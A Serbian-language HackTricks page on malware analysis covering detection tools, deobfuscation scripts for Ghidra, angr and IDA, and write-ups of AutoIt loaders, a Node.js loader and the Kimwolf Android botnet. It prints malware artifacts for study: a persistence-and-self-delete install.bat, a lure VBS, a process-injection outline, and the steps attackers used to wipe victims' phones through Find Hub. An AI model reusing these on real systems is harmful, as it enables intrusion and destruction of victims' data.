# Analiza malvera

{{#include ../../banners/hacktricks-training.md}}

## Forenzički CheatSheets

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Online servisi

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Offline antivirus i alati za detekciju

### Yara

#### Instalacija
```bash
sudo apt-get install -y yara
```
#### Pripremite pravila

Koristite ovaj skript da preuzmete i spojite sve yara malware rules sa GitHub-a: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\
Kreirajte direktorijum _**rules**_ i pokrenite skript. Ovo će kreirati fajl pod imenom _**malware_rules.yar**_ koji sadrži sve yara rules za malware.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Skeniranje
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: Provera malware-a i kreiranje pravila

Možete koristiti alat [**YaraGen**](https://github.com/Neo23x0/yarGen) za generisanje yara rules iz binarnog fajla. Pogledajte ove tutorijale: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### Instalacija
```
sudo apt-get install -y clamav
```
#### Skeniranje
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa** detektuje potencijalno zlonamerne **capabilities** u izvršnim fajlovima: PE, ELF, .NET. Dakle, pronaći će stvari kao što su Att\&ck taktike, ili sumnjive sposobnosti kao što su:

- provera greške OutputDebugString
- pokretanje kao servis
- kreiranje procesa

Preuzmite ga na [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC znači Indicator Of Compromise. IOC je skup **uslova koji identifikuju** neki potencijalno nepoželjan softver ili potvrđeni **malware**. Blue Teams koriste ovakvu definiciju da **traže ovakve zlonamerne fajlove** u svojim **sistemima** i **mrežama**.\\
Deljenje ovih definicija je veoma korisno jer kada se malware identifikuje na računaru i kreira se IOC za taj malware, drugi Blue Teams mogu ga koristiti da brže identifikuju malware.

Alat za kreiranje ili izmenu IOC-ova je [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html)**.**\\
Možete koristiti alate kao što su [**Redline**](https://www.fireeye.com/services/freeware/redline.html) za **pretragu definisanih IOCs na uređaju**.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) je skener za Simple Indicators of Compromise.\\
Detekcija se zasniva na četiri metode:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) je malware skener za Linux izdat pod GNU GPLv2 licencom, dizajniran za pretnje sa kojima se suočavaju deljena hostovana okruženja. Koristi podatke o pretnjama iz sistema za detekciju upada na ivici mreže kako bi izdvojio malware koji se aktivno koristi u napadima i generisao potpise za detekciju. Pored toga, podaci o pretnjama se dobijaju i iz korisničkih prijava pomoću LMD checkout funkcije i iz resursa malware zajednice.

### rkhunter

Alati poput [**rkhunter**](http://rkhunter.sourceforge.net) mogu se koristiti za proveru fajlsistema zbog mogućih **rootkits** i malware.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) je alat koji će pokušati da pronađe obfuscated strings unutar executables koristeći različite tehnike.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper) proverava osnovne stvari unutar executable-a (binary data, entropy, URLs and IPs, neke yara rules).

### PEstudio

[PEstudio](https://www.winitor.com/download) je alat koji omogućava dobijanje informacija o Windows executables kao što su imports, exports, headers, ali takođe će proveriti VirusTotal i pronaći potencijalne Att\&ck techniques.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) je alat za detekciju da li je fajl **encrypted** i takođe pronalaženje **packers**.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI) je Python skripta koja koristi različite **statistical methods** da detektuje **obfuscated** i **encrypted** sadržaj unutar text/script fajlova. Namena NeoPI-ja je da pomogne u **detection of hidden web shell code**.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) radi sve što može da detektuje **obfuscated**/**dodgy code** kao i fajlove koji koriste PHP funkcije često korišćene u **malwares**/webshells.

### Apple Binary Signatures

Prilikom provere nekog **malware sample** uvek treba da proverite **signature** binarnog fajla, jer developer koji ga je potpisao može već biti povezan sa **malware**.
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Tehnike detekcije

### File Stacking

Ako znate da je neki folder koji sadrži **files** veb servera bio **last updated on some date**. **Check** **date** kada su svi **files** na **web serveru were created and modified** i ako je neki datum **suspicious**, proverite taj fajl.

### Baselines

Ako **files** iz nekog foldera **shouldn't have been modified**, možete izračunati **hash** **original files** iz foldera i **compare** ih sa **current** verzijama. Sve što je izmenjeno biće **suspicious**.

### Statistical Analysis

Kada su informacije sačuvane u logovima, možete **check statistics like how many times each file of a web server was accessed as a web shell might be one of the most**.

---

### Android in-app native telemetry (no root)

Na Androidu možete instrumentisati native kod unutar procesa ciljane aplikacije tako što ćete preload-ovati malu logger biblioteku pre nego što se ostale JNI libs inicijalizuju. Ovo daje rani uvid u native ponašanje bez sistemskih hook-ova ili root pristupa. Popularan pristup je SoTap: ubacite libsotap.so za odgovarajući ABI u APK i injektujte poziv System.loadLibrary("sotap") rano (npr. static initializer ili Application.onCreate), zatim prikupljajte logove iz internog/eksternog prostora ili koristite Logcat kao fallback.

See the Android native reversing page for setup details and log paths:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

Neki Android malveri i RASP-zaštićene aplikacije skrivaju JNI imena metoda i potpise tako što ih dešifruju u runtime pre poziva RegisterNatives. Kada Frida/ptrace instrumentation bude ubijena od strane anti-debug mehanizama, i dalje možete vratiti plaintext offline izvršavanjem in-binary dekodera pomoću angr i potom ubaciti rezultate nazad u Ghidra kao komentare.

Ključna ideja: tretirajte dekoder unutar .so kao pozivnu funkciju, izvršite ga nad obfuskovanim bajt blob-ovima u .rodata i konkretizujte izlazne bajtove do prvog \x00 (C-string terminator). Obezbedite da angr i Ghidra koriste istu image base kako biste izbegli neusaglašenost adresa.

Pregled workflow-a
- Triage u Ghidra: identifikujte dekoder i njegov calling convention/argumente u JNI_OnLoad i podešavanju RegisterNatives.
- Pokrenite angr (CPython3) da izvršite dekoder za svaki ciljane stringove i dump-ujte rezultate.
- Annotate u Ghidra: automatski komentarišite dekodovane stringove na svakom call site-u za brzo rekonstrukciju JNI-a.

Ghidra triage (JNI_OnLoad pattern)
- Apply JNI datatypes to JNI_OnLoad tako da Ghidra prepozna JNINativeMethod strukture.
- Typical JNINativeMethod per Oracle docs:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- Potražite pozive na RegisterNatives. Ako biblioteka konstruiše name/signature pomoću lokalne routine (npr. FUN_00100e10) koja referencira statičku bajt tabelu (npr. DAT_00100bf4) i prima parametre poput (encoded_ptr, out_buf, length), to je idealan cilj za offline izvršavanje.

angr setup (execute the decoder offline)
- Load the .so sa istom base adresom koja se koristi u Ghidra (primer: 0x00100000) i onemogućite auto-loading eksternih libs da biste držali state malim.

<details>
<summary>angr podešavanje i offline izvršavanje dekodera</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- Na velikoj skali, napravite statičku mapu call sites prema decoder’s arguments (encoded_ptr, size). Wrappers mogu sakriti argumente, pa ovu mapu možete kreirati ručno iz Ghidra xrefs ako je API recovery noisy.

<details>
<summary>Serijsko dekodiranje više call sites pomoću angr</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Označavanje call sites u Ghidra
Opcija A: Jython-only comment writer (use a pre-computed JSON)
- Pošto angr zahteva CPython3, razdvojite deobfuscation i annotation. Prvo pokrenite angr skriptu iznad da biste generisali decoded_strings.json. Zatim pokrenite ovaj Jython GhidraScript da upišete PRE_COMMENTs na svaki call site (i uključite ime pozivajuće funkcije radi konteksta):

<details>
<summary>Ghidra Jython script to annotate decoded JNI strings</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Opcija B: Jedan CPython skript preko pyhidra/ghidra_bridge
- Alternativno, koristite pyhidra ili ghidra_bridge da pokrenete Ghidra’s API iz istog CPython procesa koji izvršava angr. Ovo omogućava pozivanje decode_string() i momentalno postavljanje PRE_COMMENTs bez privremenog fajla. Logika odražava Jython skript: izgradite callsite→function mapu preko ReferenceManager, dekodirajte sa angr, i postavite komentare.

Zašto ovo radi i kada ga koristiti
- Offline izvršavanje zaobilazi RASP/anti-debug: nije potreban ptrace, niti Frida hooks za oporavak stringova.
- Održavanje base_addr Ghidre i angra usklađenim (npr. 0x00100000) osigurava da adrese funkcija/podataka odgovaraju između alata.
- Ponavljajući recept za dekodere: tretirajte transformaciju kao čistu funkciju, alocirajte izlazni bafer u svežem state-u, pozovite ga sa (encoded_ptr, out_ptr, len), zatim konkretizujte preko state.solver.eval i parsirajte C-stringove do \x00.

Napomene i zamke
- Poštujte ciljani ABI/konvenciju poziva. angr.factory.callable bira jednu na osnovu arch; ako argumenti izgledaju pomereni, navedite cc eksplicitno.
- Ako dekoder očekuje nula-ispunjene izlazne bafer-e, inicijalizujte outbuf nulama u state-u pre poziva.
- Za position-independent Android .so, uvek navedite base_addr tako da adrese u angr odgovaraju onima viđenim u Ghidra.
- Koristite currentProgram.getReferenceManager() za enumerisanje call-xrefs čak i ako aplikacija obavija dekoder iza tankih stubova.

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Deobfuskovanje dinamičkog kontrolnog toka (JMP/CALL RAX Dispatchers)

Savremene familije malvera intenzivno zloupotrebljavaju Control-Flow Graph (CFG) obfuskovanje: umesto direktnog jump/call izračunavaju destinaciju u runtime-u i izvršavaju `jmp rax` ili `call rax`. Mali *dispatcher* (obično devet instrukcija) postavlja konačni target u zavisnosti od CPU `ZF`/`CF` flagova, potpuno onemogućavajući statičko rekonstruisanje CFG-a.

Tehniku — demonstriranu od strane SLOW#TEMPEST loader-a — može se pobediti trostepenim workflow-om koji se oslanja samo na IDAPython i Unicorn CPU emulator.

### 1. Pronađite svaki indirektni jump / call
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. Ekstrahujte dispatcher byte-code
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Emulirajte ga dvaput pomoću Unicorn
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
Pokrenite `run(code,0,0)` i `run(code,1,1)` da biste dobili odredišta grana *false* i *true*.

### 4. Patch back a direct jump / call
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
Nakon patching, naterajte IDA da ponovo analizira funkciju tako da se kompletan CFG i Hex-Rays izlaz vrate:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Obeleži indirektne API pozive

Kada je poznata stvarna destinacija svakog `call rax` možete reći IDA-i šta je to, tako da se tipovi parametara i imena promenljivih automatski obnove:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### Praktične prednosti

* Vraća stvarni CFG → dekompilacija prelazi sa *10* linija na hiljade.
* Omogućava string-cross-reference & xrefs, čineći rekonstrukciju ponašanja trivijalnom.

---

## AutoIt-based loaders: .a3x decryption, Task Scheduler masquerade and RAT injection

Ovaj obrazac upada povezuje potpisani MSI, AutoIt loaders kompajlirane u .a3x, i Task Scheduler job koji se maskira kao neškodljiva aplikacija.

### MSI → custom actions → AutoIt orchestrator

Stablo procesa i komande koje izvršavaju MSI custom actions:

- MsiExec.exe → cmd.exe da pokrene install.bat
- WScript.exe da prikaže lažni dijalog o grešci
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (dropuje loader, postavlja persistence, samoočišćava se):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (mamac za korisnika):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Key artifacts and masquerade:
- Smešta AutoIt3.exe i IoKlTr.au3 u C:\Users\Public\Music
- Kopira schtasks.exe u hwpviewer.exe (maskira se kao Hangul Word Processor viewer)
- Kreira zakazani zadatak "IoKlTr" koji se pokreće svakog minuta
- Startup LNK viđen kao Smart_Web.lnk; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- Postavlja module pod %APPDATA%\Google\Browser\ podfolderima koji sadrže `adb` ili `adv` i pokreće ih preko autoit.vbs/install.bat pomoćnika

Forensic triage tips:
- Enumeracija schtasks: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Tražite preimenovane kopije schtasks.exe koje se nalaze zajedno sa Task XML: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Uobičajeni putevi: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- Korelacija kreiranja procesa: AutoIt3.exe pokreće legitimne Windows binarne fajlove (npr., cleanmgr.exe, hncfinder.exe)

### AutoIt loaders and .a3x payload decryption → injection

- AutoIt modules su kompajlirani sa `#AutoIt3Wrapper_Outfile_type=a3x` i dekriptuju ugrađene payload-e pre nego što ih injektuju u benigni proces.
- Zapažene familije: QuasarRAT (injected into hncfinder.exe) i RftRAT/RFTServer (injected into cleanmgr.exe), kao i RemcosRAT moduli (`Remcos\RunBinary.a3x`).
- Šablon dekripcije: izvesti AES ključ putem HMAC, dekriptovati ugrađeni blob, zatim injektovati plaintext modul.

Opšti kostur dekripcije (tačan HMAC ulaz/algoritam je specifičan za porodicu):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Common injection flow (CreateRemoteThread-style):
- CreateProcess (suspended) ciljnog procesa (npr. cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory sa dekriptovanim modulom/shellcode-om
- CreateRemoteThread ili QueueUserAPC za izvršenje payload-a

Hunting ideas
- AutoIt3.exe parented by MsiExec.exe or WScript.exe koji pokreće sistemske utilitije
- Fajlovi sa `.a3x` ekstenzijom ili AutoIt script runners pod javno/korisnički upisivim putanjama
- Sumnjivi scheduled tasks koji izvršavaju AutoIt3.exe ili binarne fajlove koje Microsoft nije potpisao, sa minute-level trigger-ima

### Account-takeover abuse of Android Find My Device (Find Hub)

Tokom Windows intrusion-a, operatori su koristili ukradene Google kredencijale da više puta obrišu žrtvine Android uređaje, utišavajući notifikacije dok su proširivali pristup preko žrtvinog prijavljenog desktop messengera.

Operator steps (from a logged-in browser session):
- Review Google Account → Security → Your devices; follow Find My Phone → Find Hub (https://www.google.com/android/find)
- Select device → re-enter Google password → issue "Erase device" (factory reset); repeat to delay recovery
- Optional: clear alert e-mails in the linked mailbox (e.g., Naver) to hide security notifications

## Tracing heavily obfuscated Node.js loaders

Napadači sve češće ubacuju JavaScript loadere unutar standalone Windows binarnih fajlova kompajliranih sa [`nexe`](https://github.com/nexe/nexe), tako da runtime dolazi zajedno sa skriptom. Rezultujući PE često ima 60–90 MB i izvršava se čak i ako Node.js nije instaliran. Tokom trijaže:

- Koristite [`nexe_unpacker`](https://npm.io/package/nexe_unpacker) da izdvojite ugrađeni JavaScript iz PE i prosledite ga lokalnim alatima za statičko poređenje.
- Očekujte disk-based mutex u %TEMP% (GachiLoader drops a random `<name>.lock` file that expires after ~5 minutes). Kopiranje fajla u sandbox pre izvršenja omogućava da preskočite redundantne faze, a i dalje vidite kasnije payload-e.

### Node.js API tracing to defeat anti-analysis

Check Point’s [Nodejs-Tracer](https://github.com/CheckPointSW/Nodejs-Tracer) hooks core modules inside any Node.js process, lets you spoof anti-VM probes, and preserves every artifact the sample writes. Launch obfuscated scripts through the tracer to keep analyst-controlled instrumentation in the call stack:
```powershell
node -r .\tracer.js main.js
```
Ključne konfiguracione opcije u `tracer.js` omogućavaju vam da:

- Logujete filesystem, child-process i HTTP aktivnost (`LOG_HTTP_REQUESTS`, `SAVE_FILE_WRITES`). Svaki upušteni fajl — kao što je `kidkadi.node` — se kopira u radni direktorijum pre nego što ga malware obriše.
- Overrajdujete environment fingerprints vraćajući realistične RAM/CPU vrednosti, falsifikujući izlaz `tasklist` i manipulišući PowerShell/WMI odgovorima. Ovo zaobilazi loadere koji zahtevaju ≥4 GB RAM, ≥2 jezgra i proveravaju korisnička imena (`mashinesssss`, `wdagutilityaccount`, itd.), hostnames (`desktop-vrsqlag`, `server1` …) i imena procesa (`vmtoolsd.exe`, `fiddler.exe`, `x64dbg.exe`, `frida-server.exe`).
- Onesposobite WMI hardverske provere kao što su `Get-WmiObject Win32_DiskDrive` (tražeći `vmware`, `kvm`, `virtio`, …), `Win32_VideoController` (blokirajući “VirtualBox Graphics Adapter”, “Hyper-V Video”, itd.) i brojače `Win32_PortConnector`. Kada ti probe prijave “pravi” hardver, sandboksi više ne ulaze u beskonačnu petlju benignih `Invoke-WebRequest` poziva ka `linkedin.com`, `grok.com`, `whatsapp.com` i sličnim domenima koje GachiLoader koristi da odugovlači analizu.

### Capturing gated C2 traffic automatically

Network hooks tracera otkrivaju multi-layer C2 autentifikaciju bez potrebe za reverziranjem JavaScript obfuscation. U posmatranoj kampanji loader:

1. POST-uje host telemetry na `/log` na svakom hard-coded C2.
2. Radi `GET /richfamily/<per-sample key>` sa `X-Secret: gachifamily` da preuzme Base64-encoded payload URL.
3. Obavlja finalni `GET` ka tom URL-u sa dugim per-sample `X-Secret` header-om; izostanak istog vraća `403 Forbidden`.

Pošto tracer snima kompletne zahteve (headers, bodies, destinacije), možete replay-ovati isti saobraćaj da povučete payloads, dump-ujete Themida/VMProtect shelove u memoriji i izvučete Rhadamanthys konfiguracione podatke u većem obimu.

## AdaptixC2: Configuration Extraction and TTPs

See the dedicated page:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## Kimwolf Android Botnet Tradecraft

### APK loader & native ELF execution on TV boxes
- Malicious APKs kao što su `com.n2.systemservice06*` sadrže statički linkovan ARM ELF unutar `res/raw` (npr. `R.raw.libniggakernel`). `BOOT_COMPLETED` receiver se izvršava pri pokretanju, ekstrahuje raw resource u sandbox aplikacije (npr. `/data/data/<pkg>/niggakernel`), postavlja ga kao izvršni i poziva ga sa `su`.
- Mnogi Android TV box-ovi/tableti isporučuju se sa pre-rooted slikama ili world-writable `su`, pa loader pouzdano pokreće ELF sa UID 0 čak i bez exploit lanca. Persistencija dolazi “besplatno” jer se receiver ponovo pokreće posle svakog reboot-a ili restartovanja aplikacije.
- Reverse inženjeri koji traže ovaj obrazac mogu diff-ovati `AndroidManifest.xml` tražeći skrivene boot receivere i kod koji referencira `Resources.openRawResource` → `FileOutputStream` → `Runtime.getRuntime().exec("su")`. Kada se ELF spusti, tretirajte ga kao Linux userland backdoor (Kimwolf je UPX-packed, stripped, statically linked, 32-bit ARM EABI5).

### Runtime mutexes & masquerading IOCs
- Pri startu, Kimwolf vezuje **abstract UNIX domain socket** kao što je `@niggaboxv4`/`@niggaboxv5`. Postojeći socketi prouzrokuju izlaz, tako da ime socketa funkcioniše i kao mutex i kao forenzički artifact.
- Naslov procesa se prepisuje sa imenima koja liče na servise (`netd_services`, `tv_helper`, itd.) kako bi se stopio sa Android proces listama. Host-based detekcije mogu alarmirati na ova imena u kombinaciji sa mutex socket-om.

### Stack XOR string decoding with ARM NEON + flare_emu
- Osetljivi stringovi (C2 domeni, resolvers, DoT endpoints) se guraju na stack u enkriptovanim blokovima od 8 bajtova i dekodiraju in-place pomoću `VEOR Qx, Qx, Qy` (`veorq_s64`). Analitičari mogu skriptovati **flare_emu** da uhvate dekriptovani pointer svaki put kada decryptor preda vrednost caller-u:
```python
import flare_emu

eh = flare_emu.EmuHelper()

def hook(eh, addr, argv, _):
if eh.isValidEmuPtr(argv[1]):
print(hex(addr), eh.getEmuString(argv[1]))

eh.iterate(0x8F00, hook)  # sub_8F00 consumes the plaintext R1 argument
```
- Pretraga za `VEOR Q8, Q8, Q9` / `veorq_s64` sekvencama i emulacija njihovih opsega masovno ispisuje svaki dekriptovani string, zaobilazeći životni vek plaintext-a ograničen na stack.

### DNS-over-TLS rezolucija i XOR derivacija IP-a
- Sve Kimwolf varijante razrešavaju C2 domene koristeći **DNS-over-TLS (TCP/853)** direktno sa Google (8.8.8.8) ili Cloudflare (1.1.1.1), čime zaobilaze plain DNS logging ili hijacking.
- v4 bots jednostavno koriste vraćeni IPv4 A record. v5 bots tretiraju A record kao 32-bitni integer, zamene endianness, XOR-uju ga sa konstantom `0x00ce0491`, pa ponovo promene endianness da dobiju stvarni C2 IP. CyberChef recipe: Change IP format → swap endianness per 4-byte chunk → XOR with `00 ce 04 91` → convert back to dotted decimal.

### ENS / EtherHiding fallback
- Kasnije verzije dodaju ENS domain (`pawsatyou.eth`) čiji resolver text key `"lol"` čuva benigno-izgledajući IPv6 (`fed0:5dec:...:1be7:8599`).
- Bot uzima poslednja četiri bajta (`1b e7 85 99`), XOR-uje ih sa `0x93141715`, i interpretira rezultat kao IPv4 C2 (`136.243.146.140`). Ažuriranjem ENS text zapisa se momentalno rotiraju downstream C2s putem blockchain-a bez diranja DNS-a.

### TLS + ECDSA authenticated command channel
- Saobraćaj je enkapsuliran u wolfSSL sa prilagođenim framed protokolom:
```go
struct Header {
Magic    [4]byte // e.g. "DPRK", "FD9177FF", "AD216CD4"
Reserved uint8   // 0x01
MsgType  uint8   // verb
MsgID    uint32
BodyLen  uint32
CRC32    uint32
}
```
- Bootstrap: bot šalje dva prazna `MsgType=0 (register)` headera. C2 odgovara sa `MsgType=1 (verify)` koji sadrži nasumični challenge plus ASN.1 DER **ECDSA** potpis. Botovi to verifikuju protiv ugrađenog SubjectPublicKeyInfo bloba; neuspesi završavaju sesiju, sprečavajući hijacked/sinkholed C2 nodes da taskuju flotu.
- Kada je verifikovan, bot šalje telo `MsgType=0` koje nosi operator-defined **group string** (npr. `android-postboot-rt`). Ako je grupa omogućena, C2 odgovara sa `MsgType=2 (confirm)`, nakon čega počinje tasking (MsgType 5–12).
- Podržani verbi uključuju SOCKS-style TCP/UDP proxying (residential proxy monetization), reverse shell / single command exec, file read/write, i **Mirai-compatible DDoSBody** payloads (ista `AtkType`, `Duration`, `Targets[]`, `Flags[]` raspodela).

## References

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
